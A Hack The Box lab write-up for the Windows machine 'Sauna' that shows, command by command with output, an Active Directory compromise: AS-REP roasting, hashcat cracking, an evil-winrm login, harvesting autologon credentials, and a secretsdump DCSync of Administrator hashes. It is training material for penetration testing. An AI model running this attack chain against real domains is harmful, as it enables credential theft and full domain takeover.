---
title: 'Sauna'
date: '2026-09-21'
excerpt: 'Easy - Windows (AD Exploitation)'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Sauna</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn't require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket's psexec.py in order to gain a shell on the box as NT_AUTHORITY\SYSTEM.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the name of the HTML file that reveals the names of users working at the target company?</p>
<p class="mb-3">We start off with a Nmap scan to check open ports.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ nmap -sC -sV -A  10.129.95.180 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-20 22:56 EDT
Nmap scan report for 10.129.95.180
Host is up (0.25s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-21 10:03:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h06m33s
| smb2-time: 
|   date: 2026-09-21T10:03:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.41 seconds
```

<p class="mb-3">Opening the IP address in the web browser and exploring around let's us discover <code>/about.html</code>. There we can see the team members: Fergus Smith, Shaun Coins, Hugo Bear, Bowie Taylor, Sophie Driver, Steven Kerb.</p>
<p class="mb-5"><strong>Answer:</strong> about.html</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> Which user has Kerberos Pre-Authentication disabled?</p>
<p class="mb-3">We use a tool called Username Anarchy to create common username permutations based on the full names given. After saving the full names in separate rows to a text file <code>fullnames.txt</code>, we run the script.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ git clone https://github.com/urbanadventurer/username-anarchy.git
Cloning into 'username-anarchy'...
remote: Enumerating objects: 448, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (49/49), done.
remote: Total 448 (delta 29), reused 32 (delta 9), pack-reused 386 (from 1)
Receiving objects: 100% (448/448), 16.79 MiB | 10.86 MiB/s, done.
Resolving deltas: 100% (156/156), done.
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~/username-anarchy]
└──╼ [★]$ ls -al
total 84
drwxrwxr-x  5 aaronamran aaronamran  4096 Sep 20 23:04 .
drwx------ 23 aaronamran aaronamran  4096 Sep 20 23:03 ..
-rw-rw-r--  1 aaronamran aaronamran   291 Sep 20 23:04 CHANGELOG.md
drwxrwxr-x  4 aaronamran aaronamran  4096 Sep 20 23:04 debian
-rw-rw-r--  1 aaronamran aaronamran  3114 Sep 20 23:04 format-plugins.rb
drwxrwxr-x  8 aaronamran aaronamran  4096 Sep 20 23:04 .git
-rw-rw-r--  1 aaronamran aaronamran  1070 Sep 20 23:04 LICENSE
drwxrwxr-x  6 aaronamran aaronamran  4096 Sep 20 23:04 names
-rw-rw-r--  1 aaronamran aaronamran  9769 Sep 20 23:04 README.md
-rw-rw-r--  1 aaronamran aaronamran   100 Sep 20 23:04 test-names2.txt
-rw-rw-r--  1 aaronamran aaronamran    80 Sep 20 23:04 test-names3.txt
-rw-rw-r--  1 aaronamran aaronamran    58 Sep 20 23:04 test-names.txt
-rwxrwxr-x  1 aaronamran aaronamran 20778 Sep 20 23:04 username-anarchy
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~/username-anarchy]
└──╼ [★]$ vi fullnames.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~/username-anarchy]
└──╼ [★]$ ./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~/username-anarchy]
└──╼ [★]$ cat unames.txt
fergus
fergus.smith
ferguss
fsmith
shaun
shaun.coins
shaunc
scoins
hugo
hugo.bear
hugob
hbear
bowie
bowie.taylor
bowiet
btaylor
sophie
sophie.driver
sophied
sdriver
steven
steven.kerb
stevenk
skerb
```

<p class="mb-3">With the created usernames list, we can test if Kerberos pre-authentication has been disabled for any of them. Kerberos pre-authentication is a security feature that provides protection against password-guessing attacks. In some cases, applications require this setting to be enabled for their service account. When pre-authentication is not enforced, an attacker can directly send a dummy request for authentication. The Key Distribution Center (KDC) of the Domain Controller will check the authentication service request (AS-REQ), verify the user information and return an encrypted Ticket Granting Ticket (TGT). The TGT contains material (timestamp) that is encrypted with the NTLM hash of the corresponding account. A hash can be derived from this and can be bruteforced offline to reveal the plaintext password. Using Impacket's GetNPUser, we can attempt ASREPRoasting attack in order to extract a hash from user accounts that do not require pre-authentication.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~/username-anarchy]
└──╼ [★]$ cd && cp ~/username-anarchy/unames.txt ~
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ ls | grep unames.txt
unames.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.95.180 >> hash.txt; done < unames.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ cat hash.txt
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for fergus
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for fergus.smith
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for ferguss
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b084c61c429c7834b2c9da30ad65a588$2eb9c8530a6fd12bcf8882218166147152dc086a5f24fe1d7d770820886a9eb61ab8ad6cbb61a94f1bdd367d7a532b853e7a459b98d882b6e1f30ffc844fc381df9cec1d02d6675cf59c1b00d856c3f4148fd2e4f2e43ee34baff89f879a6488191d79e0423cb43be3caf7e69bf99a42f9e1774498900fcc28967147e3e29f2fa899e083ebb4e4d3ba957fa44937de062c05609cb59a826f7635e83a7cb1f7c22003696ab75a6a9f9cd5fe4964f8d0b818517e1578d464946014f1c8c243c447817af97cd7a05acee88e7a7c50da41531edde4c1d9d46afa5e399aa6dad3dcceb2fb78853014a695ef1400d74252951ec36f906455601992ba784b9a8bfde244
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for shaun
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for shaun.coins
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for shaunc
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for scoins
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for hugo
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for hugo.bear
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for hugob
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for hbear
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for bowie
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for bowie.taylor
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for bowiet
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for btaylor
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for sophie
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for sophie.driver
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for sophied
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for sdriver
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for steven
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for steven.kerb
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for stevenk
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for skerb
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

<p class="mb-3">Notice how the user <code>fsmith</code> is the only true positive in the results.</p>
<p class="mb-5"><strong>Answer:</strong> fsmith</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What is the hash format returned from this AS-REP Roasting attack? Given the answer as the string between the first and third $ characters, including the $.</p>

```txt
[...]

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b084c61c429c7834b2c9da30ad65a588$2eb9c8530a6fd12bcf8882218166147152dc086a5f24fe1d7d770820886a9eb61ab8ad6cbb61a94f1bdd367d7a532b853e7a459b98d882b6e1f30ffc844fc381df9cec1d02d6675cf59c1b00d856c3f4148fd2e4f2e43ee34baff89f879a6488191d79e0423cb43be3caf7e69bf99a42f9e1774498900fcc28967147e3e29f2fa899e083ebb4e4d3ba957fa44937de062c05609cb59a826f7635e83a7cb1f7c22003696ab75a6a9f9cd5fe4964f8d0b818517e1578d464946014f1c8c243c447817af97cd7a05acee88e7a7c50da41531edde4c1d9d46afa5e399aa6dad3dcceb2fb78853014a695ef1400d74252951ec36f906455601992ba784b9a8bfde244
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[...]
```

<p class="mb-5"><strong>Answer:</strong> $krb5asrep$23$</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What is the password of the user fsmith?</p>
<p class="mb-3">We save <code>fsmith</code>'s hash into a text file and pass it to hashid to determine the hash type.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ vi fsmithhash.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ cat fsmithhash.txt | hashid
Analyzing '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b084c61c429c7834b2c9da30ad65a588$2eb9c8530a6fd12bcf8882218166147152dc086a5f24fe1d7d770820886a9eb61ab8ad6cbb61a94f1bdd367d7a532b853e7a459b98d882b6e1f30ffc844fc381df9cec1d02d6675cf59c1b00d856c3f4148fd2e4f2e43ee34baff89f879a6488191d79e0423cb43be3caf7e69bf99a42f9e1774498900fcc28967147e3e29f2fa899e083ebb4e4d3ba957fa44937de062c05609cb59a826f7635e83a7cb1f7c22003696ab75a6a9f9cd5fe4964f8d0b818517e1578d464946014f1c8c243c447817af97cd7a05acee88e7a7c50da41531edde4c1d9d46afa5e399aa6dad3dcceb2fb78853014a695ef1400d74252951ec36f906455601992ba784b9a8bfde244'
[+] Unknown hash
```

<p class="mb-3">Unfortunately it does not work, so we use hashcat instead. We run <code>hashcat --help | grep Kerberos</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ hashcat --help | grep Kerberos
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

<p class="mb-3">We choose Kerberos 5 AS-REP etype 23 (mode 18200), which we specify when running Hashcat.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ hashcat -m 18200 fsmithhash.txt -o fsmithpassword.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 3921/7907 MB (988 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC 7543 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b084c61...fde244
Time.Started.....: Sun Sep 20 23:52:03 2026, (5 secs)
Time.Estimated...: Sun Sep 20 23:52:08 2026, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1866.4 kH/s (0.83ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Thelittlemermaid

Started: Sun Sep 20 23:51:54 2026
Stopped: Sun Sep 20 23:52:10 2026
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ cat fsmithpassword.txt 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b084c61c429c7834b2c9da30ad65a588$2eb9c8530a6fd12bcf8882218166147152dc086a5f24fe1d7d770820886a9eb61ab8ad6cbb61a94f1bdd367d7a532b853e7a459b98d882b6e1f30ffc844fc381df9cec1d02d6675cf59c1b00d856c3f4148fd2e4f2e43ee34baff89f879a6488191d79e0423cb43be3caf7e69bf99a42f9e1774498900fcc28967147e3e29f2fa899e083ebb4e4d3ba957fa44937de062c05609cb59a826f7635e83a7cb1f7c22003696ab75a6a9f9cd5fe4964f8d0b818517e1578d464946014f1c8c243c447817af97cd7a05acee88e7a7c50da41531edde4c1d9d46afa5e399aa6dad3dcceb2fb78853014a695ef1400d74252951ec36f906455601992ba784b9a8bfde244:Thestrokes23
```

<p class="mb-5"><strong>Answer:</strong> Thestrokes23</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> Now that you have a valid set of credentials, on what port can you connect to the machine and get an interactive shell?</p>
<p class="mb-3">So far we have the credentials <code>fsmith</code>:<code>Thestrokes23</code>. We can try to login using WinRM at port 5985.</p>#
<p class="mb-5"><strong>Answer:</strong> 5985</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Submit the flag located on the fsmith user's desktop.</p>
<p class="mb-3">We use Evil-WinRM to login by running <code>evil-winrm -i [TARGET_IP] -u fsmith -p 'Thestrokes23'</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/21/2026   3:01 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
60a2a9100227aa308ab5265a04968f5c
```

<p class="mb-5"><strong>Answer:</strong> 60a2a9100227aa308ab5265a04968f5c</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> What user is configured to autologin?</p>
<p class="mb-3">Downloading WinPEAS to our local attacker machine and uploading it to the target machine in the active Evil-WinRM session and running it reveals the following information:</p>

```console
*Evil-WinRM* PS C:\Users\FSmith\Desktop> upload winPEASx64.exe
                                        
Info: Uploading /home/aaronamran/winPEASx64.exe to C:\Users\FSmith\Desktop\winPEASx64.exe
                                        
Data: 15020712 bytes of 15020712 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\FSmith\Desktop> .\winPEASx64.exe
[...]
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found (T1083)
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [Allow: AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
[...]
```

<p class="mb-5"><strong>Answer:</strong> svc_loanmanager</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What is the password of the svc_loanmanager user?</p>
<p class="mb-5"><strong>Answer:</strong> Moneymakestheworldgoround!</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> What is the dangerous permission does Bloodhound show the svc_loanmanager user has over the domain? If there is more than one permission, give the longest.</p>
<p class="mb-3">We can use Bloodhound to enumerate and visualise the Active Directory domain, and identify possible attack chains that will allow us to elevate our domain privileges. We will use bloodhound-python ingestor to remotely collect data from the Active Directory, then we upload it into Bloodhound to visualise the available attack paths. We need to add the domain name into the <code>/etc/hosts</code> file too. Then we run <code>sudo ntpdate [TARGET_IP]</code> to sync our local attacker machine with a precise network time server using NTP.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ sudo echo "10.129.95.180  egotistical-bank.local sauna.egotistical-bank.local sauna" | sudo tee -a /etc/hosts
10.129.95.180  egotistical-bank.local sauna.egotistical-bank.local sauna
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ sudo ntpdate 10.129.95.180
2026-09-21 08:51:41.571312 (-0400) +25594.177759 +/- 0.124550 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25594.177759
```

<p class="mb-3">If BloodHound is not installed in the local machine, first we need to run <code>sudo apt update && sudo apt install bloodhound</code>, then we run <code>sudo bloodhound-setup</code> which creates the database and installs neo4j. The default credentials given are <code>neo4j</code>:<code>neo4j</code>, which is optional for us to change (in this lab I did not bother to change). To start BloodHound, we run <code>bloodhound --no-sandbox</code>, and BloodHound should open in the web browser, which we login using the default credentials <code>neo4j</code>:<code>neo4j</code>.</p>
<p class="mb-3">Now for bloodhound-python, we first need to create a Python virtual environment by running <code>python3 -m venv htb</code>. Then we activate the virtual environment by running <code>source htb/bin/activate</code>. Inside the virtual environment, we then run <code>pip install --upgrade pip</code> and then <code>pip install bloodhound-python</code>. Now we can use bloodhound-python to remotely collect the data from the target's Active Directory.</p>

```console
(htb) ┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::7d81:c9c2:37ce:65ee
INFO: Trying LDAP connection to dead:beef::7d81:c9c2:37ce:65ee
INFO: Testing resolved hostname connectivity dead:beef::19d
INFO: Trying LDAP connection to dead:beef::19d
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::7d81:c9c2:37ce:65ee
INFO: Trying LDAP connection to dead:beef::7d81:c9c2:37ce:65ee
INFO: Testing resolved hostname connectivity dead:beef::19d
INFO: Trying LDAP connection to dead:beef::19d
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 56S
INFO: Compressing output into 20260921090925_bloodhound.zip
```

<p class="mb-3">Now that the bloodhound-python ZIP file has been created, we return to the Bloodhound Web GUI and click on the 'Upload Data' icon button on the right panel, then upload the <code>yyyymmddhhmmss_bloodhound.zip</code> file. In the search bar of the left panel (the same row as the hamburger icon), we search for <code>SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL</code>, click on the Pathfinding icon, and enter <code>EGOTISTICAL-BANK.LOCAL</code>. Right-clicking on the DCSync Edge and selecting Help displays the information 'The user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain EGOTISTICAL-BANK.LOCAL. These two privileges allow a principal to perform a DCSync attack.' Clicking on the Linux Abuse tab shows 'You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script: <code>secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'</code> You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab.'</p>
<p class="mb-5"><strong>Answer:</strong> GetChangesAll</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> You know that the user svc_loanmanager is able to perform a DCSync attack. By doing so, you will get the hash for the Administrator user. What is the common name of the attack that allows users to authenticate with their hashes instead of cleartext passwords?</p>
<p class="mb-5"><strong>Answer:</strong> Pass the Hash</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> Submit the flag located on the administrator user's desktop.</p>
<p class="mb-3">As hinted by Bloodhound earlier, we can use Impacket's secretsdump to perform the DCSync attack. The script will reveal the NTLM hashes for all domain users using the replication privileges.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ secretsdump.py egotistical-bank/svc_loanmgr@10.129.95.180 -just-dc-user Administrator
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 
```

